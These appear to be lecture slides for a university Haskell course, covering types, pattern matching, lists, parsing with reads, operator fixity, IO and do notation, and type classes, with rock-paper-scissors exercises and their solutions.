=======================================

-  Some basic types:

   -  ``Bool`` - either ``True`` or ``False``
   -  ``Char`` - a unicode code point (i.e., a character)
   -  ``Int`` - fixed-size integer
   -  ``Integer`` - an arbitrary-size integer
   -  ``Double`` - an IEEE double-precision floating-point number
   -  *type1* ``->`` *type2* - a function from *type1* to *type2*
   -  ``(`` *type1* ``,`` *type2* ``,`` … ``,`` *typeN* ``)`` - a
      tuple
   -  ``()`` - a zero-tuple, pronounced *unit* (kind of like ``void`` in
      C); there is only one value of this type, also written ``()``

-  You can declare the type of a symbol or expression with ``::``

   .. code:: haskell

      x :: Integer
      x = (1 :: Integer) + (1 :: Integer) :: Integer

   -  ``::`` has lower precedence than any function operators (including
      ``+``)

More on types
=============

-  Function application happens one argument at a time (a.k.a. “*currying*”)

   .. code:: haskell

      add :: Integer -> (Integer -> Integer)
      add arg1 arg2 = arg1 + arg2

   -  So ``add 2 3`` is equivalent to ``(add 2) 3``
   -  ``(add 2)`` takes 3 returns 5, so
      ``(add 2) has type Integer -> Integer``
   -  ``->`` associates to the right, so parens usually omitted in
      multi-argument function types: ``fn ::`` *argType1* ``->``
      *argType2* ``->`` … ``->`` *argTypeN* ``->`` *resultType*

-  Usually the compiler can infer types

   -  You can ask
      `GHCI <http://www.haskell.org/ghc/docs/latest/html/users_guide/ghci.html>`__
      to show you inferred types with ``:t``

   ::

      *Main> :t add
      add :: Integer -> Integer -> Integer

   -  Good practice to declare types of top-level bindings anyway
      (compiler warns if missing)

User-defined data types
=======================

-  The ``data`` keyword declares user-defined data types (like
   ``struct`` in C):

   .. code:: haskell

      data PointT = PointC Double Double deriving Show

   -  Declares new type, ``PointT`` with constructor ``PointC``
      containing two ``Double`` s
   -  ``deriving Show`` means you can print the type (helpful in GHCI)
   -  Can also derive ``Read``, ``Eq``, ``Ord``, ``Enum``, ``Bounded``

-  Note that data types and constructors *must* start with capital
   letters

-  Types and constructors can use the same name (often do), E.g.:

   .. code:: haskell

      data Point = Point Double Double deriving Show

-  One type can have multiple constructors (like a tagged union):

   .. code:: haskell

      data Point = Cartesian Double Double
                 | Polar Double Double
                   deriving Show

   .. code:: haskell

      data Color = Red | Green | Blue | Violet deriving (Show, Eq, Enum)

Using data types
================

-  Constructors act like functions producing values of their types

   .. code:: haskell

      data Point = Point Double Double deriving Show
      myPoint :: Point
      myPoint = Point 1.0 1.0

   .. code:: haskell

      data Color = Red | Green | Blue | Violet deriving (Show, Eq, Enum)
      myColor :: Color
      myColor = Red

-  ``case`` statements & function bindings “de-construct” values with
   *patterns*

   .. code:: haskell

      getX, getMaxCoord :: Point -> Double
      getX point = case point of
                     Point x y -> x
      getMaxCoord (Point x y) | x > y     = x
                              | otherwise = y

   .. code:: haskell

      isRed :: Color -> Bool
      isRed Red = True        -- Only matches constructor Red
      isRed c   = False       -- Lower-case c just a variable

Exercise: Rock, Paper, Scissors referee
=======================================

-  Given the following types for a rock-paper-scissors game:

   .. code:: haskell

      data Move = Rock | Paper | Scissors
           deriving (Eq, Read, Show, Enum, Bounded)

      data Outcome = Lose | Tie | Win deriving (Show, Eq, Ord)

-  Define a function ``outcome :: Move -> Move -> Outcome``

   -  The first move should be your own, the second your opponent’s
   -  Should tell you if you won, lost, or tied

::

   GHCi, version 7.6.3: http://www.haskell.org/ghc/  :? for help
   ...
   *Main> outcome Rock Paper
   Lose
   *Main> outcome Scissors Paper
   Win
   *Main> outcome Paper Paper
   Tie

Answer
======

.. code:: haskell

   data Move = Rock | Paper | Scissors deriving (Eq, Read, Show, Enum, Bounded)

   data Outcome = Lose | Tie | Win deriving (Show, Eq, Ord)

   -- | @outcome our_move their_move@
   outcome :: Move -> Move -> Outcome
   outcome Rock Scissors        = Win
   outcome Paper Rock           = Win
   outcome Scissors Paper       = Win
   outcome us them | us == them = Tie
                   | otherwise  = Lose

Parameterized types
===================

-  Types can have parameters sort of the way functions do

   -  Type parameters start with lower-case letters
   -  Some examples from the standard Prelude

   .. code:: haskell

      data Maybe a = Just a
                   | Nothing

   .. code:: haskell

      data Either a b = Left a
                      | Right b

-  You can see these at work in GHCI:

   ::

      Prelude> :t Just True
      Just True :: Maybe Bool
      Prelude> :t Left True
      Left True :: Either Bool b   

-  Notice the type of ``Left True`` contains a type variable, ``b``

   -  Expression ``Left True`` can be of type ``Either Bool b`` for any
      type ``b``
   -  This is an example of a feature called *parametric polymorphism*

More deconstruction tips
========================

-  Special variable “``_``” can be bound but not used

   -  Use it when you don’t care about a value:

   .. code:: haskell

      isJust :: Maybe a -> Bool    -- note parametric polymorphism
      isJust (Just _) = True
      isJust Nothing  = False

   .. code:: haskell

      isRed Red = True
      isRed _   = False            -- we don't need the non-red value

   -  Compiler warns if a bound variable not used; ``_`` avoids this

-  You can deconstruct types and bind variables within guards, E.g.:

   .. code:: haskell

      addMaybes mx my | Just x <- mx, Just y <- my = Just (x + y)
      addMaybes _ _                                = Nothing

   though often there is a simpler way

   .. code:: haskell

      addMaybes (Just x) (Just y) = Just (x + y)
      addMaybes _ _               = Nothing

Lists
=====

-  We could define homogeneous lists with the ``data`` keyword

   .. code:: haskell

      data List a = Cons a (List a) | Nil

      oneTwoThree = (Cons 1 (Cons 2 (Cons 3 Nil))) :: List Integer

-  But Haskell has built-in lists with syntactic sugar

   -  Instead of ``List Integer``, the type is written ``[Integer]``
   -  Instead of ``Cons``, the constructor is called ``:`` and is
      *infix*
   -  Instead of ``Nil``, the empty list is called ``[]``

   .. code:: haskell

      oneTwoThree = 1:2:3:[] :: [Integer]

   -  But there are even more convenient syntaxes for the same list:

   .. code:: haskell

      oneTwoThree' = [1, 2, 3]  -- comma-separated elements within brackets
      oneTwoThree'' = [1..3]    -- define list by a range

-  A ``String`` is just a list of ``Char``, so
   ``['a', 'b', 'c'] == "abc"``

-  You can pattern match on literal lists and ``String`` s

Some basic list functions in Prelude
====================================

.. code:: haskell

   head :: [a] -> a
   head (x:_) = x
   head []    = error "head: empty list"

.. code:: haskell

   tail :: [a] -> [a]           -- all but first element
   tail (_:xs) = xs
   tail []     = error "tail: empty list"

.. code:: haskell

   a ++ b :: [a] -> [a] -> [a]  -- infix operator concatenate lists
   [] ++ ys     = ys
   (x:xs) ++ ys = x : xs ++ ys

.. code:: haskell

   length :: [a] -> Int         -- This code is from language spec
   length []    =  0            -- GHC implements differently, why?
   length (_:l) =  1 + length l

.. code:: haskell

   filter :: (a -> Bool) -> [a] -> [a]
   filter pred [] = []
   filter pred (x:xs)
     | pred x     = x : filter pred xs
     | otherwise  = filter pred xs

Note function ``error :: String -> a`` reports assertion failures

Parsing with ``deriving Read`` and ``reads``
============================================

-  We’ve been using “``deriving Show``” and ``show`` to print values

   -  By default ``show`` show gives you a valid Haskell expression

   ::

      *Main> show $ Point 1.0 1.0
      "Point 1.0 1.0"               <-- could paste string into your source

-  “``deriving Read``” lets you parse a value at run time

   .. code:: haskell

      data Point = Point Double Double deriving (Show, Read)

   -  Problem: Might be 0, 1, or (if ambiguous) more possible parsings
   -  Function ``reads`` parses and returns
      ``[(value, string_with_rest_of_input)]``

   ::

      *Main> reads "invalid Point 1 2" :: [(Point, String)]
      []
      *Main> reads "Point 1 2" :: [(Point, String)]
      [(Point 1.0 2.0,"")]
      *Main> reads "Point 1 2 and some extra stuff" :: [(Point, String)]
      [(Point 1.0 2.0," and some extra stuff")]
      *Main> reads "(Point 1 2)" :: [(Point, String)] -- note parens OK
      [(Point 1.0 2.0,"")]

Exercise: Using ``reads``
=========================

-  Write a function to parse moves:

   .. code:: haskell

      parseMove :: String -> Maybe Move

   -  Return ``Just`` move on successful parse, ``Nothing`` otherwise
   -  Can optionally accept whitespace or parentheses if easier
   -  But should reject a string with any trailing content after move

-  Examples of use:

.. code:: haskell

   *Main> parseMove "Rock"
   Just Rock
   *Main> parseMove "Paper"
   Just Paper
   *Main> parseMove "Scissors plus extra junk"
   Nothing

Possible solutions
==================

-  Use ``reads``:

   .. code:: haskell

      parseMove :: String -> Maybe Move
      parseMove str = case reads str of [(m, "")] -> Just m
                                        _         -> Nothing

   -  ``reads`` return type implicitly constrained by ``parseMove`` ’s
      type declaration

   -  Removing ``parseMove`` ’s type would make calling it difficult

-  Directly match keywords:

   .. code:: haskell

      parseMove :: String -> Maybe Move
      parseMove "Rock"     = Just Rock
      parseMove "Paper"    = Just Paper
      parseMove "Scissors" = Just Scissors
      parseMove _          = Nothing

   -  Note how strings are constructors—you can pattern match on them

   -  But this solution too finicky–won’t except trailing carriage
      returns or spaces. If you did this change to using reads.

Being more permissive of line disciplines
=========================================

-  If reading terminal input, different OSes have different disciplines

   -  E.g., might have trailing ``"\n"`` or ``"\r\n"``

-  Let’s tolerate trailing whitespace

   -  Change your definition to:

   .. code:: haskell

      parseMove :: String -> Maybe Move
      parseMove str = case reads str of
        [(m, rest)] | ok rest -> Just m
        _                     -> Nothing
        where ok = all (`elem` " \r\n")

   -  Should now behave like this

   ::

      *Main> parseMove "Rock  \r\n"
      Just Rock
      *Main> parseMove "Rock  \r\njunk"
      Nothing

Hoogle
======

-  Let’s find the source code for GHC’s ``length`` function?
-  `Hoogle <http://www.haskell.org/hoogle/>`__ is a search engine just
   for Haskell functions

   -  Go to http://www.haskell.org/hoogle/
   -  Click on *search plugin*
   -  Keyword “``haskell.org``” is too long for me–I change to “``ho``”

-  Let’s search for length… click on source

   -  All those ``#`` marks are for “unboxed types”, which are faster
      but not asymptotically
   -  The important point is that ``len`` is tail recursive

-  I use Hoogle all the time, all the time when coding

   -  Most of the source code is not hard to understand
   -  Length may be a bad starter example just because of unboxed types
   -  Try examining the code of the functions you are using to
      understand them better

Example: counting letters
=========================

-  Here’s a function to count lower-case letters in a ``String``

   .. code:: haskell

      import Data.Char    -- brings function isLower into scope

      countLowerCase :: String -> Int
      countLowerCase str = length (filter isLower str)

-  If we fix ``length``, ``countLowerCase`` might run in constant space

   -  Recall Haskell evaluates expressions lazily… Means in most
      contexts values are interchangeable with function pointers (a.k.a.
      *thunks*)

   -  A ``String`` is a ``[Char]``, which is a type with two values, a
      *head* and *tail*

   -  But until each of the *head* or *tail* is needed, it can be stored
      as a function pointer

   -  So ``length`` will causes ``filter`` to produce ``Char`` s one at
      a time

   -  ``length`` does not hold on to characters once counted; can be
      garbage-collected at will

Function composition
====================

-  Here’s an even more concise definition

   .. code:: haskell

      countLowerCase :: String -> Int
      countLowerCase = length . filter isLower

-  The “``.``” operator provides function composition

   .. code:: haskell

      (f . g) x = f (g x)

   -  “``f . g``” is an ASCII approximation of mathematical
      “:math:`f\circ g`”
   -  On previous slide, ``countLowerCase`` ’s argument had name
      ``str``
   -  The new version doesn’t name the argument, a style called
      *point-free*

-  Function composition can be used almost like Unix pipelines

   .. code:: haskell

      process = countLowercase . toPigLatin . extractComments . unCompress

-  Exercise: Write the type of “``.``” without typing ``:t (.)`` into
   ghci

Lambda abstraction
==================

-  Sometimes you want to name the arguments but not the function

-  Haskell allows anonymous functions through *lambda abstraction*

   -  The notation is ``\`` *variable(s)* ``->`` *body*
   -  “``\``” is an ASCII approximation of “:math:`\lambda`”, so
      pronounced “lambda”

-  Example:

   .. code:: haskell

      countLowercaseAndDigits :: String -> Int
      countLowercaseAndDigits =
          length . filter (\c -> isLower c || isDigit c)

-  Lambda abstractions can deconstruct values with patterns, e.g.:

   .. code:: haskell

              ... (\(Right x) -> x) ...

   -  But note that guards or multiple bindings are not allowed
   -  Patterns must have the right constructor or will get run-time
      error

Infix vs. Prefix notation
=========================

-  We’ve seen some infix functions & constructors: ``+``, ``*``, ``/``,
   ``.``, ``||``, ``:``

-  In fact, any binary function or constructor can be used infix or
   prefix

-  For functions and constructors composed of letters, digits, ``_``,
   and ``'``

   -  Prefix is the default: ``add 1 2``
   -  Putting function in backticks makes it infix:
      :literal:`1 \`add\` 2`

-  For functions starting with one of ``!#$%&*+./<=>?@\^|-~`` or
   constructors starting “``:``”

   -  Infix is default, Putting functions in parens makes them prefix,
      e.g., ``(+) 1 2``

-  For tuples, prefix constructors are ``(,)``, ``(,,)``, ``(,,,)``,
   ``(,,,,)``, etc.

-  Infix functions can be partially applied in a parenthesized *section*

   .. code:: haskell

      stripPunctuation :: String -> String
      stripPunctuation = filter (`notElem` "!#$%&*+./<=>?@\\^|-~:")
      -- Note above string the SECOND argument to notElem ^

Fixity
======

-  Most operators are just library functions in Haskell

   -  Very few operators reserved by language syntax (``..``, ``:``,
      ``::``, ``=``, ``\``, ``|``, ``<-``, ``->``, ``@``, ``~``, ``=>``,
      ``--``)
   -  You can go crazy and define your own operators
   -  Or even use your own definitions instead of system ones

-  Define precedence of infix operators with fixity declarations

   -  Keywords: ``infixl``/``infixr``/``infix`` for left/right/no
      associativity
   -  Syntax: *infix-keyword* [0-9] *function* [, *function* …]
   -  Allowed wherever a type declaration is allowed

-  0 is lowest allowed fixity precedence, 9 is highest

   -  Prefix function application has fixity 10–higher than any infix
      call
   -  Lambda abstractions, ``else`` clauses, and ``let`` … ``in``
      clauses extend as far to the right as possible (meaning they never
      stop at any infix operator, no matter how low precedence)

Fixity of specific operators
============================

-  Here is the fixity of the `standard operators <http://www.haskell.org/onlinereport/haskell2010/haskellch4.html#x10-820061>`__:

.. code:: haskell

   infixl 9  !!             -- This is the default when fixity unspecified
   infixr 9  .
   infixr 8  ^, ^^, ⋆⋆
   infixl 7  ⋆, /, `quot`, `rem`, `div`, `mod`  
   infixl 6  +, -           -- Unary negation "-" has this fixity, too
   infixr 5  ++             -- built-in ":" constructor has this fixity, too
   infix  4  ==, /=, <, <=, >=, >, `elem`, `notElem`
   infixr 3  &&
   infixr 2  ||
   infixl 1  >>, >>=
   infixr 1  =<<  
   infixr 0  $, $!, `seq`

-  If you can’t remember, use ``:i`` in
   `GHCI <http://www.haskell.org/ghc/docs/latest/html/users_guide/ghci.html>`__:

   ::

      Prelude> :i &&
      (&&) :: Bool -> Bool -> Bool    -- Defined in GHC.Classes
      infixr 3 &&

   -  If GHCI doesn’t specify, means default: ``infixl 9``

The “``infixr 0``” operators
============================

-  ``$`` is function application, but with lowest precedence

   .. code:: haskell

      ($) :: (a -> b) -> a -> b
      f $ x = f x

   -  Turns out to be quite useful for avoiding parentheses, E.g.:

   .. code:: haskell

          putStrLn $ "the value of " ++ key ++ " is " ++ show value

-  ``seq :: a -> b -> b`` just returns value of second argument… but
   forces evaluation of the first argument before evaluating the second

   -  So when you are done, the first argument is a value, not a thunk

   .. code:: haskell

      main = let q = 1 `div` 0
             in seq q $ putStrLn "Hello world!\n"  -- exception

   -  ``seq`` has to be built into the compiler

-  ``$!`` combines ``$`` and ``seq``

   .. code:: haskell

      f $! x  = x `seq` f x

Accumulators revisited
======================

-  We used an accumulator to avoid ``n0`` stack frames in ``factorial``:

.. code:: haskell

   factorial n0 = loop 1 n0
       where loop acc n | n > 1     = loop (acc * n) (n - 1)
                        | otherwise = acc

-  Unfortunately, ``acc`` can contain a chain of thunks ``n`` long

   -  ``(((1 * n) * (n - 1)) * (n - 2) ...)`` – Laziness means only
      evaluated when needed
   -  GHC is smart enough not to build up thunks, but only if optimizing

-  Can fix such problems using ``$!`` or ``seq``

.. code:: haskell

   factorial n0 = loop 1 n0
       where loop acc n | n > 1     = (loop $! acc * n) (n - 1)
                        | otherwise = acc

.. code:: haskell

   factorial n0 = loop 1 n0
       where loop acc n | n > 1     = acc `seq` loop (acc * n) (n - 1)
                        | otherwise = acc

Hackage and cabal
=================

-  `Hackage <http://hackage.haskell.org/packages/>`__ is a large
   collection of Haskell packages

-  `Cabal <http://www.haskell.org/cabal/users-guide/>`__ is a tool for
   browsing hackage and installing packages

   -  Cabal comes with the `haskell
      platform <http://hackage.haskell.org/platform/>`__

   -  Run ``cabal update`` to create ``$HOME/.cabal``, download package
      database

   -  I highly recommend unconmenting and editing these two lines in
      ``$HOME/.cabal/config``

      ::

         documentation: True
         library-profiling: True

   -  May want to add ``$HOME/.cabal/bin`` to your path

   -  I use the following shell alias

      ::

         alias cbi='LC_CTYPE=en_US.UTF-8 cabal install --user --haddock-hyperlink-source'

-  E.g., run: ``cbi network``

   -  Installs packages in ``$HOME/.cabal``, and records them in
      ``$HOME/.ghc``
   -  To start fresh, must delete both ``$HOME/.cabal`` and
      ``$HOME/.ghc``

Modules and ``import`` syntax
=============================

-  Haskell groups top-level bindings into *modules*

   -  Default module name is ``Main``, as programs start at function
      ``main`` in ``Main``
   -  Except for ``Main``, a module named *M* must reside in a file
      named *M* ``.hs``
   -  Module names are capitalized; I use lower-case file names for
      ``Main`` modules

-  Let’s add this to the top of our source file

   .. code:: haskell

      module Main where      -- redundant since Main is the default
      import System.IO

   -  Start module with “``module`` *name* ``where``” or “``module``
      *name* ``(`` *exported-symbol* [``,`` …] ``) where``”
      (non-exported symbols provide modularity)
   -  ``import`` *module* - imports all symbols in *module*
   -  ``import qualified`` *module* ``as`` *ID* - prefixes imported
      symbols with *ID* ``.``
   -  ``import`` *module* ``(`` *function1* [``,`` *function2*
      …] ``)`` - imports just the named functions
   -  ``import`` *module* ``hiding (`` *function1* [``,`` *function2*
      …] ``)`` - imports all but the named functions

``do`` notation
===============

-  Let’s write a function to greet someone

-  Type the following into a file ``greet.hs``:

   -  Or shortcut, type: ``wget``
      ```cs240h.stanford.edu/greet1.hs`` <http://cs240h.stanford.edu/greet1.hs>`__

.. code:: haskell

   module Main where
   import System.IO

   greet h = do
     hPutStrLn h "What is your name?"
     name <- hGetLine h
     hPutStrLn h $ "Hi, " ++ name

   withTty = withFile "/dev/tty" ReadWriteMode

   main = withTty greet

-  Now try running ``main`` in GHCI

.. raw:: html

   <!--
   * Can the code like this in GHCI

   ~~~
   *Main> main
   What is your name?
   David
   Hi, David
   ~~~

   * Or from the command line:

   ~~~
   $ runghc ./greet.hs
   ~~~
   -->

.. _do-notation-1:

``do`` notation
===============

.. code:: haskell

   greet h = do
     hPutStrLn h "What is your name?"
     name <- hGetLine h
     hPutStrLn h $ "Hi, " ++ name

-  Greeting task requires some impure (non-functional) actions

   -  Reading and writing a file handle

-  A ``do`` block lets you sequence IO actions. In a ``do`` block:

   -  *pat* ``<-`` *action* - binds *pat* (variable or constructor
      pattern) to result of executing *action*
   -  ``let`` *pat* ``=`` *pure-value* - binds *pat* to *pure-value* (no
      “``in`` …” required)
   -  *action* - executes *action* and discards the result, or returns
      it if at end of block

-  GHCI input is like ``do`` block (i.e., can use ``<-``, need ``let``
   for bindings)
-  ``do``/``let``/``case`` won’t parse after prefix function

   -  Usually say “``func $ do`` …”
   -  Can also say “``func (do`` … ``)``”

What are the types of IO actions?
=================================

.. code:: haskell

   main :: IO ()
   greet :: Handle -> IO ()
   hPutStrLn :: Handle -> String -> IO ()
   hGetLine :: Handle -> IO String

-  ``IO`` is a parameterized type (just as ``Maybe`` is parameterized)

   -  “``IO String``” means IO action that produces a ``String`` if
      executed
   -  Unlike ``Maybe``, we won’t use a constructor for ``IO``, which is
      somewhat magic

-  What if we try to copy a line of input as follows?

   .. code:: haskell

      main = hPutStrLn stdout (hGetLine stdin)

   -  Oops, ``hPutStrLn`` expects type ``String``, while ``hGetLine``
      returns an ``IO String``

-  How to de-construct an ``IO [String]`` to get a ``[String]``

   -  We can’t use ``case``, because we don’t have a constructor for
      ``IO`` … Besides, the order and number of deconstructions of
      something like ``hPutStr`` matters
   -  That’s the point of the ``<-`` operator in ``do`` blocks!

.. _another-way-to-see-io-peyton-jonesawkward:

Another way to see IO ``[Peyton Jones]``
========================================

http://research.microsoft.com/en-us/um/people/simonpj/papers/marktoberdorf/mark.pdf

.. code:: haskell

   do name <- hGetLine h
      hPutStrLn h $ "Hi, " ++ name

.. image:: https://www.scs.stanford.edu/14sp-cs240h/slides/io1.svg

-  ``hGetLine`` and ``hPutStrLn`` return ``IO`` *actions* that can
   change the world

   -  Pure code can manipulate such actions, but can’t actually execute
      them
   -  Only the special ``main`` action is ever executed

.. _another-way-to-see-io-peyton-jonesawkward-1:

Another way to see IO ``[Peyton Jones]>``
=========================================

http://research.microsoft.com/en-us/um/people/simonpj/papers/marktoberdorf/mark.pdf

.. code:: haskell

   do name <- hGetLine h
      hPutStrLn h $ "Hi, " ++ name

.. image:: https://www.scs.stanford.edu/14sp-cs240h/slides/io2.svg

-  The ``do`` block builds a compound action from other actions

   -  It sequences how actions will be applied to the real world
   -  When executed, applies ``IO a`` actions to the world, extracting
      values of type ``a``
   -  What action to execute next can depend on the value of the
      extracted ``a``

Running ``greet``
=================

::

   $ ghc --make greet
   [1 of 1] Compiling Main             ( greet.hs, greet.o )
   Linking greet ...
   $ ./greet
   What is your name?
   David
   Hi, David

-  What if you want to run it in GHCI?

   ::

      $ ghci ./greet.hs
      ...
      Prelude Main>

   -  No ``*`` before ``Main`` means no access to internal symbols
      (because compiled), need to say:

   ::

      Prelude Main> :load *greet.hs
      [1 of 1] Compiling Main             ( greet.hs, interpreted )
      Ok, modules loaded: Main.
      *Main> 

The ``return`` function
=======================

-  What if we want ``greet`` to return the name of the person?

   -  Last action is ``hPutStrLn :: IO ()``; want to end with action
      returning ``name``

   -  This does not work:

      .. code:: haskell

         do ...
            hPutStrLn h $ "Hi, " ++ name
            name                         -- Incorrect, will not compile

   -  Problem: every action in an ``IO`` do block must have type
      ``IO a`` for some ``a``

   -  Solution: ``return`` function gives trivial ``IO`` action
      returning a particular value

   .. code:: haskell

      greet :: Handle -> IO String
      greet h = do
        hPutStrLn h "What is your name?"
        name <- hGetLine h
        hPutStrLn h $ "Hi, " ++ name
        return name

-  Note: **``return`` is not control flow statement**, just a function

   .. code:: haskell

      return :: a -> IO a

.. raw:: html

   <!--
       * In a `do` block, "`let x = e`" is like "`x <- return e`" (except
         recursive)
   -->

Point-free IO composition
=========================

-  Recall point-free function composition with “``.``” (fixity
   ``infixr 9``)

-  Function ``>>=`` (pronounced “bind”) allows point-free IO composition

   .. code:: haskell

      (>>=) :: IO a -> (a -> IO b) -> IO b
      infixl 1 >>=

-  Let’s re-write ``greet`` with point-free style to avoid variable
   ``name``

   .. code:: haskell

      greet h = do
        hPutStrLn h "What is your name?"
        hGetLine h >>= hPutStrLn h . ("Hi, " ++)

   -  Note ``>>=`` composes left-to-right, while ``.`` goes
      right-to-left

-  ``do`` blocks are just 
   `syntactic sugar <http://www.haskell.org/onlinereport/haskell2010/haskellch3.html#x8-470003.14>`__
   for calling ``>>=``

   .. code:: haskell

      -- Desugared version of original greet:
      greet h = hPutStrLn h "What is your name?" >>= \_ ->
                hGetLine h >>= \name ->
                hPutStrLn h ("Hi, " ++ name)

.. raw:: html

   <!--
       * Let's de-sugar our original `main`:

       ~~~~ {.haskell}
       main =
           getArgs >>= \(url:_) ->
           simpleHttp url >>= \page ->
           putStr (L.toString page)
       ~~~~
   -->

.. raw:: html

   <!--
   # Lazy IO

   * Some simple file IO functions may be handy for first lab

       ~~~~ {.haskell}
       type FilePath = String -- makes FilePath synonym for String
       getContents :: IO String          -- read all stdin
       readFile :: FilePath -> IO String -- read (whole) file
       writeFile :: FilePath -> String -> IO ()  -- write file
       ~~~~

   * E.g., `main = readFile "input" >>= writeFile "output"`
       * Surprisingly, this program does not require unbounded memory
       * Rather, input is read lazily as the list of Characters is
         evaluated
   * How lazy IO works
       * A list has two values, the head and the tail, each possibly a
         thunk
       * At some point evaluating thunk actually triggers file IO
       * Function `unsafeInterleaveIO` creates thunks that execute `IO`
         actions
         (c.f. more widely used `unsafePerformIO`, described in
         [[Peyton Jones]][Awkward])
       * Lazy IO is great for scripts, bad for servers; more in Iteratee
         lecture
   -->

Exercise: Rock, Paper, Scissors against the computer
====================================================

-  Write a function to play a particular move against a user

   -  First argument is computer’s move
   -  Read user’s move from ``Handle``, tell user whether s/he
      won/lost/tied

   .. code:: haskell

      computerVsUser :: Move -> Handle -> IO ()

-  Starter code: ``wget``
   ```cs240h.stanford.edu/rock1.hs`` <http://cs240h.stanford.edu/rock1.hs>`__

-  Example:

   ::

      *Main> withTty $ computerVsUser Rock
      Please enter one of [Rock,Paper,Scissors]
      garbage
      Please enter one of [Rock,Paper,Scissors]
      Paper
      You Win
      *Main> withTty $ computerVsUser Scissors
      Please enter one of [Rock,Paper,Scissors]
      Paper
      You Lose

A possible solution
===================

.. code:: haskell

   getMove :: Handle -> IO Move
   getMove h = do
     hPutStrLn h $ "Please enter one of " ++ show ([minBound..] :: [Move])
     -- Here is the added code:
     input <- hGetLine h
     case parseMove input of Just move -> return move
                             Nothing -> getMove h

   computerVsUser :: Move -> Handle -> IO ()
   computerVsUser computerMove h = do
     userMove <- getMove h
     let o = outcome userMove computerMove
     hPutStrLn h $ "You " ++ show o

More on polymorphism
====================

-  We’ve seen a bunch of polymorphic functions
-  Here are some more handy ones from Prelude

.. code:: haskell

   id :: a -> a
   id x = x

.. code:: haskell

   const :: a -> b -> a
   const a _ = a

.. code:: haskell

   fst :: (a, b) -> a
   fst (a, _) = a

.. code:: haskell

   snd :: (a, b) -> b
   snd (_, b) = b

.. code:: haskell

   print a = putStrLn (show a)   -- what's the type?  a -> IO ()?

.. code:: haskell

   show a = ???                  -- how to implement?

Parametric vs. ad hoc polymorphism
==================================

-  There are actually *two* kinds of polymorphism at work here
-  *parametric polymorphism* – does the same thing for every type

   -  E.g., ``id :: a -> a`` just passes the value through
   -  Works for every possible type

-  *ad hoc polymorphism* – does different things on different types

   -  E.g., ``1 + 1`` and ``1.0 + 1.0`` compute very different functions
   -  E.g., ``show`` converts value to ``String``, depends entirely on
      input type
   -  Only works on types that support it (hence “``deriving Show``” in
      declarations)
   -  E.g., no way to ``show`` a function (type ``Int -> Int``)

Classes and Instances
=====================

-  Ad-hoc polymorphic functions are called *methods* and declared with
   *classes*

   .. code:: haskell

      class MyShow a where
          myShow :: a -> String

-  The actual method for each type is defined in an *instance*
   declaration

   .. code:: haskell

      data Point = Point Double Double
      instance MyShow Point where
          myShow (Point x y) = "(" ++ show x ++ ", " ++ show y ++ ")"

   -  A class declaration can also include default definitions for
      methods

-  What’s the type of a function that calls ``myShow``? Ask GHCI:

   .. code:: haskell

      myPrint x = putStrLn $ myShow x

   ::

      *Main> :t myPrint
      myPrint :: MyShow a => a -> IO ()

The Context of a type declaration
=================================

-  Type declarations can contain restrictions on type variables

   -  Restrictions expressed with “``(`` *class* *type-var*,
      … ``) =>``” at start of type, E.g.:

   .. code:: haskell

      myPrint :: MyShow a => a -> IO ()

   .. code:: haskell

      sortAndShow :: (Ord a, MyShow a) => [a] -> String

   .. code:: haskell

      elem :: (Eq a) => a -> [a] -> Bool
      elem _ []     = False
      elem x (y:ys) = x==y || elem x ys

   .. code:: haskell

      add :: (Num a) => a -> a -> a
      add arg1 arg2 = arg1 + arg2

-  Can think of context as representing hidden *dictionary* arguments

   -  When you call ``myPrint``, you explicitly give it a value of type
      ``a``
   -  But also implicitly give it a function pointer for type ``a`` ’s
      ``MyShow`` instance

.. _the-dreadeddmrwiki-monomorphism-restrictiondmr-dmr:

The ``Dreaded`` ``Monomorphism Restriction`` (DMR)
==================================================

.. _Dreaded: http://www.haskell.org/haskellwiki/Monomorphism_restriction
.. _Monomorphism Restriction: http://www.haskell.org/onlinereport/haskell2010/haskellch4.html#x10-930004.5.5

-  Let’s say you want to cache result of super-expensive function

   .. code:: haskell

      superExpensive val = len $ veryExpensive (val :: Int)
          where len [] = 0
                len (x:xs) = 1 + len xs
      cachedResult = superExpensive 5

   -  ``cachedResult`` will start as thunk, be executed once, then
      contain value

-  Let’s think about the types

   ::

      *Main> :t superExpensive
      superExpensive :: Num a => Int -> a
      *Main> :t cachedResult
      cachedResult :: Integer

   -  + and 0 are overloaded, so ``superExpensive`` can return any
      ``Num`` you want
   -  Why don’t we have ``cachedResult :: (Num a) => a``?
   -  Recall context restrictions are like hidden arguments… so would
      make ``cachedResult`` into a function, undermining our caching
      goal!
   -  But how is compiler smart enough to save us here?

The DMR continued
=================

-  Answer: in this case, compiler is not actually that smart

   -  Heuristic: If it looks like a function, can infer *ad hoc*
      polymorphic types
   -  If it looks like anything else, no *ad hoc* polymorphism unless
      explicitly declared
   -  *parametric* polymorphic types can always be inferred (no hidden
      arguments)

-  What looks like a function?

   -  Has to bind a single symbol (``f``), rather than a pattern
      (``(x, y) =`` …, ``(Just x) =`` …)
   -  Has to have at least one explicit argument (``f x =`` … ok,
      ``f =`` … not)

-  How are monomorphic types inferred?

   -  If bound symbol used elsewhere in module, infer type from use
   -  If still ambiguous and type is of class ``Num``, try ``Integer``
      then ``Double`` (this sequence can be changed with a ```default``
      declaration <http://www.haskell.org/onlinereport/haskell2010/haskellch4.html#x10-790004.3.4>`__)
   -  If still ambiguous, compilation fails

The DMR take-away message
=========================

-  Think of type restrictions as implicit dictionary arguments

   -  Compiler won’t saddle non-function with implicit arguments

-  This code will compile

   .. code:: haskell

      -- Compiler infers: show1 :: (Show x) => x -> String
      show1 x = show x

-  But neither of these will:

   .. code:: haskell

      show2 = show
      show3 = \x -> show x

   -  I’d rather you heard it from me than from GHC…

-  Relatively easy to work around DMR

   -  Add type signatures to functions–a good idea anyway for top-level
      bindings, and sometimes necessary for ``let`` bindings

      .. code:: haskell

         -- No problem, compiler knows you want ad hoc polymorphism
         show2 :: (Show x) => x -> String
         show2 = show

Superclasses and instance contexts
==================================

-  One class may require all instances to be members of another

   -  Class ``Eq`` contains ‘==’ and ‘/=’ methods, while ``Ord``
      contains ``<``, ``>=``, ``>``, ``<=``, etc.

   -  It doesn’t make sense to have an ``Ord`` instance not also be an
      ``Eq`` instance

   -  ``Ord`` declares ``Eq`` as a superclass, using a context

      .. code:: haskell

         class Eq a => Ord a where
             (<), (>=), (>), (<=) :: a -> a -> Bool
             a <= b = a == b || a < b -- default methods can use superclasses
             ....

   -  Don’t need to write superclass restrictions in contexts–any
      function with an ``Ord`` dictionary can lookup the ``Eq``
      dictionary

